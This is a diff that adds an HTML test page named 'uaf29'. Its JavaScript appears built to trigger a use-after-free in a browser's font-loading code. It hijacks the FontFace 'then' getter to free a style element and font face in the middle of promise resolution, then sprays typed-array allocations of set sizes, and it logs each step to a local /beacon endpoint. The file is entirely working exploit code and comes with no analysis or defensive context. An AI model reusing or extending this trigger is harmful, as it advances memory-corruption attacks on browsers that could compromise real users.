@@ -1,0 +1,44 @@
+<!doctype html><meta charset="utf-8"><title>uaf29</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var ARMS=[64,96,128,160,192];
+var cur=0, styleEl=null, fired=false, keep=[];
+function arm(k){
+  cur=k;
+  fired=false;
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: fam"+k+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A=new FontFace('face'+k,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  keep.push(A);
+  b('U29-ARM-'+k+'-SIZE-'+ARMS[k]+'-START');
+  document.fonts.load('1em face'+k+', fam'+k,'AB').then(function(){
+    b('U29-ARM-'+k+'-RESOLVED');
+    if (k+1<ARMS.length) setTimeout(function(){ arm(k+1); }, 30);
+    else b('U29-DONE-ALL');
+  }, function(){
+    b('U29-ARM-'+k+'-REJECTED');
+    if (k+1<ARMS.length) setTimeout(function(){ arm(k+1); }, 30);
+    else b('U29-DONE-ALL');
+  });
+}
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if (fired) return undefined;
+    fired=true;
+    var sz=ARMS[cur];
+    if (styleEl) styleEl.remove();
+    try { document.fonts.delete(this); } catch(e){}
+    document.body.offsetHeight;
+    for (var i=0;i<8;i++) keep.push(new Uint8Array(sz));
+    try { document.fonts.check('1em fam'+cur); } catch(e){}
+    b('U29-ARM-'+cur+'-SPRAYED-'+sz);
+    return undefined;
+  },
+  set:function(){}
+});
+function run(){ b('U29-PARSE'); arm(0); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
